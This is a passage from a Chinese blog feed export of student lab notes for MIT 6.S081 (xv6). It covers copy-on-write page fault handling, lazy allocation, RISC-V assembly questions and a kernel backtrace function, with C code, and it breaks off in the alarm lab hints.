title="usertrap"></a>usertrap</h2><p>对页错误的trap进行捕获，然后排除以下情况</p><ol><li>地址本来就不合法，超出了最大范围，这可能引起页错误</li><li>如果这一页的W权限位为1，说明不是因为不能写导致的trap，那我们也处理不了</li><li>如果这一页的V标志位为0，那也不是我们能处理的</li><li>同样，如果这一页不是COW页，那我们也处理不了</li></ol><p>第2，3,4在xv6里面其实是有点重复的判断，但是小心点反正不会出bug</p><p>还有一个细节就是在uvmunmap的时候，dofree必须是0，因为我们在kcopy的时候已经给这个页面的引用减1了，如果dofree&#x3D;1，待会还得减1，就会出bug</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((which_dev = devintr()) != <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">// ok</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (r_scause() == <span class="hljs-number">12</span> || r_scause() == <span class="hljs-number">13</span> || r_scause() == <span class="hljs-number">15</span>) &#123;<br>    <span class="hljs-comment">// 地址越界</span><br>    <span class="hljs-keyword">if</span> (r_stval() &gt;= p-&gt;sz) &#123;<br>        p-&gt;killed = <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 分配新的一页</span><br>        <span class="hljs-type">pte_t</span> *pte = walk(p-&gt;pagetable, r_stval(), <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 不存在，或者不是cow页</span><br>        <span class="hljs-keyword">if</span> ((*pte &amp; PTE_W) != <span class="hljs-number">0</span> || ((*pte) &amp; PTE_V) == <span class="hljs-number">0</span> || ((*pte) &amp; PTE_C) == <span class="hljs-number">0</span>) &#123;<br>            p-&gt;killed = <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">void</span> *pa = (<span class="hljs-type">void</span> *)PTE2PA(*pte);<br>            <span class="hljs-type">void</span> *npa = kcopy(pa);<br>            <span class="hljs-comment">// 申请内存失败</span><br>            <span class="hljs-keyword">if</span> (npa == <span class="hljs-number">0</span>) &#123;<br>                p-&gt;killed = <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 已经获得了一块属于自己的物理内存，将地址和标志位更新到页表中</span><br>                <span class="hljs-type">int</span> flag = PTE_FLAGS(*pte);<br>                flag |= PTE_W;<br>                flag &amp;= ~PTE_C;<br>                uvmunmap(p-&gt;pagetable, PGROUNDDOWN(r_stval()), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>                mappages(p-&gt;pagetable, PGROUNDDOWN(r_stval()), PGSIZE, (uint64)npa, flag);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="copyout"><a href="#copyout" class="headerlink" title="copyout"></a>copyout</h2><p>整体逻辑和trap捕获差不多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">copyout</span><span class="hljs-params">(<span class="hljs-type">pagetable_t</span> pagetable, uint64 dstva, <span class="hljs-type">char</span> *src, uint64 len)</span> &#123;<br>    uint64 n, va0, pa0;<br><br>    <span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0</span>) &#123;<br>        va0 = PGROUNDDOWN(dstva);<br>        pa0 = walkaddr(pagetable, va0);<br>        <span class="hljs-keyword">if</span> (pa0 == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        <span class="hljs-comment">// 到了这里，肯定是一个合法的值了，但是不一定可以写啊</span><br>        <span class="hljs-type">pte_t</span> *pte = walk(pagetable, va0, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 如果是cow并且不可以写</span><br>        <span class="hljs-keyword">if</span> (*pte &amp; PTE_C &amp;&amp; !(*pte &amp; PTE_W)) &#123;<br>            <span class="hljs-comment">// 请求获得一块物理内存</span><br>            <span class="hljs-type">void</span> *npa = kcopy((<span class="hljs-type">void</span> *)pa0);<br>            <span class="hljs-keyword">if</span> (npa == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>            <span class="hljs-comment">// 这个物理内存可用</span><br>            <span class="hljs-type">int</span> flag = PTE_FLAGS(*pte);<br>            flag &amp;= ~PTE_C;<br>            flag |= PTE_W;<br>            uvmunmap(pagetable, va0, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>            mappages(pagetable, va0, PGSIZE, (uint64)npa, flag);<br>            pa0 = (uint64)npa;<br>        &#125;<br>        n = PGSIZE - (dstva - va0);<br>        <span class="hljs-keyword">if</span> (n &gt; len)<br>            n = len;<br>        memmove((<span class="hljs-type">void</span> *)(pa0 + (dstva - va0)), src, n);<br><br>        len -= n;<br>        src += n;<br>        dstva = va0 + PGSIZE;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ol><li>如果需要维护一个全局性的变量，你不用让所有文件都能直接访问到它。可以在全局提供一个可以操作和查询它的函数即可。</li><li>能放在一个函数内部解决的事情就放在一个函数内部解决。特别是对已有的函数增加某些新的判断或者功能时，以全局改动最少的做法为标准。</li><li>对于临界变量，只要在可能访问或者修改它的前后加锁和解锁即可。如果提前return，记得解锁。</li><li>如果要修改一个函数或者某个属性，那要充分考虑到它可能被使用的场景，比如这里的kfree，除了正常的调用，还有freerange。</li></ol>]]></content>
    
    
    <categories>
      
      <category>Operating System</category>
      
      <category>MIT6.S081</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Operating System</tag>
      
      <tag>MIT6.S081</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6.s081_lab5</title>
    <link href="/2023/08/22/6-s081-lab5/"/>
    <url>/2023/08/22/6-s081-lab5/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224204355.png" alt="20231224204355"></p><h1 id="Eliminate-allocation-from-sbrk"><a href="#Eliminate-allocation-from-sbrk" class="headerlink" title="Eliminate allocation from sbrk()"></a>Eliminate allocation from sbrk()</h1><p>第一个任务是去阻止<code>sysproc.c</code>中的<code>sys_sbrk()</code>函数真的分配内存，只需要增<code>p-&gt;sz</code>即可</p><p>一行代码+注释即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">uint64<br><span class="hljs-title function_">sys_sbrk</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-type">int</span> addr;<br>    <span class="hljs-type">int</span> n;<br><br>    <span class="hljs-keyword">if</span> (argint(<span class="hljs-number">0</span>, &amp;n) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    addr = myproc()-&gt;sz;<br>    myproc()-&gt;sz += n;<br>    <span class="hljs-comment">// if(growproc(n) &lt; 0)</span><br>    <span class="hljs-comment">//   return -1;</span><br>    <span class="hljs-keyword">return</span> addr;<br>&#125;<br></code></pre></td></tr></table></figure><p>这时候会发生两个错误</p><p><img src="https://img-blog.csdnimg.cn/img_convert/07c36752439fc524fc1ade90bbd4b6ad.png" alt="image-20230822161829120"></p><ol><li>usertrap的错误<ol><li>页面错误是由硬件触发的，当硬件发现pte中的有效位为0时，就会陷入内核，并且设置<code>r_scause</code>为页错误相关的标志</li></ol></li><li>uvmunmap错误<ol><li>有可能一个进程申请了一块内存，但是却没有真正使用，所以页表中是没有对应的一项的</li><li>结果在之后销毁这块内存的时候，还是会去页表中删除这一项，这一删就发现， 根本没有被mapped</li></ol></li></ol><h1 id="Lazy-allocation"><a href="#Lazy-allocation" class="headerlink" title="Lazy allocation"></a>Lazy allocation</h1><h2 id="task"><a href="#task" class="headerlink" title="task"></a>task</h2><ol><li><p>修改<code>trap.c</code>中的代码，使其能够对用户空间的页错误进行反应</p><p> 通过映射一个新分配的物理内存页到出错的地址，并返回到用户空间使得进程继续执行</p></li><li><p>视情况修改其他的内核代码</p></li></ol><h2 id="hints"><a href="#hints" class="headerlink" title="hints"></a>hints</h2><ol><li>你可以通过检查<code>r_scause</code>是13还是15来判断是否是一个页错误</li><li><code>r_stval()</code>存储了引起错误的虚拟地址</li><li>从<code>uvmalloc</code>函数学习，你需要调用<code>kalloc</code>和<code>mappages</code></li><li>使用<code>PGROUNDDOWN(va)</code>去得到虚拟页面的地址</li><li>修改<code>uvmunmap()</code>使其在碰到一个页面没有被mapped时不要panic</li><li>如果内核崩了，在汇编代码中查看sepc</li><li>使用你的<code>vmprint</code>函数去打印页表</li><li>如果出现<code>incomplete type proc</code>，去include<code>spinlock.h</code>和<code>proc.h</code></li></ol><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p><code>usertrap</code>中增加一个else if分支，关键操作就是kalloc和mappages，即申请一个操作，再增加一个映射</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (r_scause() == <span class="hljs-number">13</span> || r_scause() == <span class="hljs-number">15</span>) &#123;<br>    uint64 va = r_stval();<br>    <span class="hljs-comment">// 虚拟地址本来就不合法</span><br>    <span class="hljs-keyword">if</span> (va &gt;= p-&gt;sz) &#123;<br>        p-&gt;killed = <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        uint64 pa = (uint64)kalloc();<br>        <span class="hljs-comment">// 内存用完了， 杀死进程</span><br>        <span class="hljs-keyword">if</span> (pa == <span class="hljs-number">0</span>) &#123;<br>            p-&gt;killed = <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            va = PGROUNDDOWN(va);<br>            <span class="hljs-comment">// 增加映射，如果失败了</span><br>            <span class="hljs-keyword">if</span> (mappages(p-&gt;pagetable, va, PGSIZE, pa, PTE_W | PTE_X | PTE_R | PTE_U) != <span class="hljs-number">0</span>) &#123;<br>                kfree((<span class="hljs-type">void</span> *)pa);<br>                p-&gt;killed = <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, r_scause(), p-&gt;pid);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;            sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());<br>    p-&gt;killed = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>uvmunmap</code>中修改为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((*pte &amp; PTE_V) == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">continue</span>;<br></code></pre></td></tr></table></figure><p>就成功了</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f2ac39e40f008ff80626dd9ab5615f32.png" alt="image-20230822163902501"></p><h1 id="Lazytests-and-Usertests"><a href="#Lazytests-and-Usertests" class="headerlink" title="Lazytests and Usertests"></a>Lazytests and Usertests</h1><h2 id="task-1"><a href="#task-1" class="headerlink" title="task"></a>task</h2><ol><li>通过<code>lazytests</code>和<code>usertests</code></li></ol><h2 id="hints-1"><a href="#hints-1" class="headerlink" title="hints"></a>hints</h2><ol><li>处理sbrk的参数为负数的情况</li><li>如果一个进程访问的虚拟地址超过了通过sbrk分配的</li><li>正确处理<code>fork</code>中父进程到子进程的内存拷贝</li><li>正确处理一个进程通过系统调用read或者write传递了一个合法的虚拟地址，但是对应的内存地址却没有被分配</li><li>正确处理内存用完的限制，即kalloc如果失败，则杀死进程</li><li>处理用户堆栈下面无用的页面错误，即guardpage</li></ol><p>一个一个hins来</p><h2 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h2><p>第1个是参数为负数，特判一下就行，如果是负数，就按原来的方式处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>) &#123;<br>    myproc()-&gt;sz += n;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (growproc(n) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>第2个和第6个通过这个判断就可以搞定</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">va &gt;= p-&gt;sz || va &lt; p-&gt;trapframe-&gt;sp<br></code></pre></td></tr></table></figure><p>有个之前没搞清楚的点，那就是通过p-&gt;trapframe-&gt;sp取得的是栈顶指针，栈指针又是向下走的。而栈指针往下，除了一个guardpage是没有映射之外，其他的page都应该是有映射的，即pte的有效位为0。因此，如果引发了页故障并且地址还低于栈顶指针，说明肯定是碰到了guardpage的</p><p>第3个其实说的是<code>uvmcopy</code>函数，这个函数就是将父进程的页表原模原样的拷贝给子进程，但是有的虚拟页面连父节点自己都没有映射，子节点哪来的映射，因此碰到找不到pte或者pte有问题的情况，直接continue就行了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((pte = walk(old, i, <span class="hljs-number">0</span>)) == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">continue</span>;<br><span class="hljs-comment">// panic(&quot;uvmcopy: pte should exist&quot;);</span><br><span class="hljs-keyword">if</span> ((*pte &amp; PTE_V) == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">continue</span>;<br><span class="hljs-comment">// panic(&quot;uvmcopy: page not present&quot;);</span><br></code></pre></td></tr></table></figure><p>第4个的问题在于，如果是系统调用，那它会先在usertrap中进入syscall的处理流程，不会进入我们新添加的流程，所以会有问题</p><p>通过对write函数的不断追踪，可以发现，牵扯到的是walkaddr函数。其实就是现在需要使用这个地址了，但是原始的walkaddr不能正确返回一个物理地址，因为压根就没有。所以在walkaddr中增加创建映射的代码即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((*pte &amp; PTE_V) == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br>    <span class="hljs-comment">// 地址不合法</span><br>    <span class="hljs-keyword">if</span> (va &gt;= p-&gt;sz || va &lt; p-&gt;trapframe-&gt;sp) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    uint64 pa = (uint64)kalloc();<br>    <span class="hljs-keyword">if</span> (pa == <span class="hljs-number">0</span>) &#123;<br>        panic(<span class="hljs-string">&quot;memory run out\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (mappages(p-&gt;pagetable, va, PGSIZE, pa, PTE_W | PTE_X | PTE_R | PTE_U) != <span class="hljs-number">0</span>) &#123;<br>        kfree((<span class="hljs-type">void</span> *)pa);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// *pte = PA2PTE(pa) | PTE_W | PTE_X | PTE_R | PTE_U | PTE_V;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>第5点，只要你用了kalloc后判断了它的返回值，然后panic就行</p>]]></content>
    
    
    <categories>
      
      <category>Operating System</category>
      
      <category>MIT6.S081</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Operating System</tag>
      
      <tag>MIT6.S081</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6.s081_lab4</title>
    <link href="/2023/08/21/6-s081-lab4/"/>
    <url>/2023/08/21/6-s081-lab4/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224204241.png" alt="20231224204241"></p><blockquote><p>在开始做lab之前务必弄清楚</p><ol><li>所谓的系统调用，本质上就是内核态和用户态之间的切换</li><li>内核态和用户态的区别本质上就是一些关键属性的区别，比如页表<br> 而他们的运行方式都一样，就是取指执行，没有魔法<br> 只不过内核态和用户态的执行不在一个体系上，所以切换会比较复杂，但<strong>这些切换也就只是修改一些关键属性</strong></li><li>进程的运行本质上就是一些值不断的变化，trapframe中的值完全可以保存并复现一个进程执行到了哪里<strong>加粗样式</strong></li></ol></blockquote><h1 id="PreRead"><a href="#PreRead" class="headerlink" title="PreRead"></a>PreRead</h1><ul><li><input checked="" disabled="" type="checkbox"> xv6 book的第四章</li><li><input checked="" disabled="" type="checkbox"> <code>kernel/trampoline.S</code>：在用户态和内核态进行切换的汇编代码</li><li><input checked="" disabled="" type="checkbox"> <code>kernel/trap.c</code>：处理陷入的代码</li></ul><h1 id="RISC-V-assembly"><a href="#RISC-V-assembly" class="headerlink" title="RISC-V assembly"></a>RISC-V assembly</h1><h2 id="task"><a href="#task" class="headerlink" title="task"></a>task</h2><p>有一个文件<code>user/call.c</code>，通过<code>make fs.img</code>可以编译并生成一个可读性很高的汇编代码<code>user/call.asm</code>。</p><p>阅读这个汇编代码中的函数<code>g</code>,<code>f</code>,<code>main</code>，并回答以下问题</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> a0-a7,a2<br><span class="hljs-bullet">2.</span> 被优化了？<br><span class="hljs-bullet">3.</span> 630<br><span class="hljs-bullet">4.</span> 38<br><span class="hljs-bullet">5.</span> He110 World，第一个是直接输出十六进制的表示，第二个是将十六进制的每个字节看做一个字符，并且是小端法<br>   将i改成0x726c6400,57616不用改<br><span class="hljs-bullet">6.</span> 随机值，因为相当于调用printf的时候没有给出寄存器a2的值，那么这时候就会根据a2的值随机出现答案<br></code></pre></td></tr></table></figure><h1 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h1><h2 id="task-1"><a href="#task-1" class="headerlink" title="task"></a>task</h2><p>如果能够清楚在错误发生之前的一系列函数调用，那么对debug很有帮助</p><ol><li><p>在<code>kernel/printf.c</code>中实现一个<code>backtrace()</code>函数</p><p> 是<code>kernel</code>文件夹里的，不是<code>user</code>文件夹里，<code>user</code>文件夹里也有一个<code>printf.c</code></p></li><li><p>在<code>sys_sleep</code>中插入对<code>backtrace</code>函数的调用</p></li><li><p>运行<code>bttest</code>，它会调用<code>sys_sleep</code>，你的输出应该是</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">backtrace:<br><span class="hljs-number">0x0000000080002cda</span><br><span class="hljs-number">0x0000000080002bb6</span><br><span class="hljs-number">0x0000000080002898</span><br></code></pre></td></tr></table></figure><p> 在<code>bttest</code>结束之后，在你的终端中运行</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">addr2line -e kernel/kernel</span><br>0x0000000080002de2<br>0x0000000080002f4a<br>0x0000000080002bfc<br>Ctrl-D<br></code></pre></td></tr></table></figure><p> 你会看到</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">kernel/sysproc.c:<span class="hljs-number">74</span><br>kernel/syscall.c:<span class="hljs-number">224</span><br>kernel/trap.c:<span class="hljs-number">85</span><br></code></pre></td></tr></table></figure></li><li><p>编译器会给每个栈帧一个<code>frame pointer</code>，你应该使用这个指针去遍历栈并且打印每个栈帧中保存的返回地址</p></li></ol><h2 id="hints"><a href="#hints" class="headerlink" title="hints"></a>hints</h2><ol><li><p>记得在<code>kernel/defs.h</code>中声明你的<code>backtrace</code>函数</p></li><li><p>GCC编译器将栈指针存放在当前执行函数的<code>s0</code>寄存器中，将下面这个函数添加到<code>kernel/riscv.h</code>中，并且在<code>backtrace</code>函数中调用它</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> uint64<br><span class="hljs-title function_">r_fp</span><span class="hljs-params">()</span><br>&#123;<br>  uint64 x;<br>  <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;mv %0, s0&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span> (x) )</span>;<br>  <span class="hljs-keyword">return</span> x;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>返回地址位于<code>fp-8</code>的固定位置</p><p> 被保存的栈帧地址位于<code>fp-16</code>的固定位置</p><p> <img src="https://img-blog.csdnimg.cn/img_convert/f03c5fde0787a85a798df5841844081f.png" alt="image-20230821111932007"></p></li><li><p>你可以使用这两个宏，有助于终止<code>backtrace</code>的循环</p><p> <code>PGROUNDDOWN(fp)</code>计算栈顶的位置</p><p> <code>PGROUNDUP(fp)</code>计算栈底的位置</p></li><li><p>如果你的<code>backtrace</code>工作了，可以在<code>kernel/printf.c</code>的<code>panic</code>调用它，这样一旦内核出错了，你就可以看到调用栈</p></li></ol><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>一行一行地打印函数调用的地址，思路比较简单</p><ol><li>首先通过文档提供给我们的<code>r_fp</code>函数获得当前的<code>fp</code></li><li>通过这个fp不断打印这个函数的返回地址，并将fp置为上一个函数的fp，具体位置如上面那个栈帧的图所示</li></ol><p>具体实现上</p><ol><li>需要通过hints里提示的宏，找到栈帧的终点，也是我们循环的终点。<ol><li>注意了，这个终点也就是最高层的函数，它不需要继续打印了，而它自己也被它调用的函数打印了，因此就直接结束</li><li>fp这个指针，并不能直接取值，将它减8，它才正好指向当前栈帧底部的第一个值，注意！</li></ol></li><li>如果想打印出64位，并在前面补0，前面还加上0x，用%p就可以打印出来了，不用自己瞎搞，chatgpt还忽悠人</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">backtrace</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;backtrace:\n&quot;</span>);<br>    uint64 fp = r_fp();<br>    uint64 up_edge = PGROUNDUP(fp);<br>    <span class="hljs-keyword">while</span> (fp &lt; up_edge) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, *(uint64 *)(fp - <span class="hljs-number">8</span>));<br>        fp = *(uint64 *)(fp - <span class="hljs-number">16</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h1><h2 id="task-2"><a href="#task-2" class="headerlink" title="task"></a>task</h2><blockquote><p>在这个练习中，你将给xv6增加一个特性，即会根据CPU时间周期性地alert一个进程</p><p>如果你的解答可以通过<code>alarmtest</code>和<code>usertests</code></p></blockquote><ol><li><p>你应该添加一个新的系统调用<code>sigalarm(interval,handler)</code></p></li><li><p>如果一个应用调用了<code>sigalarm(n,fn)</code></p><p> 那么在这个应用消耗了n ticks个CPU时间后，内核会调用函数<code>fn</code></p><p> 当<code>fn</code>返回后，应用会回到被打断的地方继续执行</p></li><li><p>如果一个应用调用了<code>sigalarm(0,0)</code>，内核应该暂停生成周期性的alarm</p></li><li><p>在你的xv6文件中有一个文件叫<code>user/alarmtest.c</code>，你需要将其加入到Makefile</p><p> 只有你正确添加了<code>sigalarm</code>和<code>sigreturn</code>系统调用之后，才可以正确编译</p></li></ol><h2 id="hints1"><a href="#hints1" class="headerlink" title="hints1"></a>hints1</h2><ul><li><p>首先修改内核，跳转到用户空间的<code>alarm handler</code></p><p>  这将让<code>test0</code>打印<code>alarm!</code></p></li><li><p>现在还不用管打印之后发生了什么，你的程序在打印之后崩了就行</p></li></ul><ol><li><p>你需要去修改Makefile，让它去编译<code>alarmtest.c</code>成为用户程序</p></li><li><p>在<code>user/user.h</code>中正确的声明应该如下</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sigalarm</span><span class="hljs-params">(<span class="hljs-type">int</span> ticks, <span class="hljs-type">void</span> (*handler)())</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">sigreturn</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure></li><li><p>更新<code>user/usys.pl</code>，<code>kernel/syscall.h</code>和<code>kernel/syscall.c</code></p><p> 使得<code>alarmtest</code>能够调用<code>sigalarm</code>和<code>sigreturn</code>系统调用</p></li><li><p>至此你的<code>sys_sigreturn</code>应该只返回0</p><p> 你的<code>sys_sigalarm</code>应该存下alarm的间隔和处理函数的指针到<code>proc</code>结构体的新的区域</p></li><li><p>你需要去跟踪自从上次调用alarm的处理函数到现在已经过去了多少<code>ticks</code></p><p> 这也需要在<code>struct proc</code>中增加一个新的字段，你可以在<code>proc.c 的 allocproc()</code>中初始化这个字段</p></li><li><p>每次来一个<code>tick</code>，都会在<code>kernel/trap.c</code>的<code>usertrap</code>中被处理</p><p> 你只需要在有时钟中断的时候操作</p></li><li><p>只需要在一个进程有$timer\ outstanding$的时候调用alarm函数</p><p> 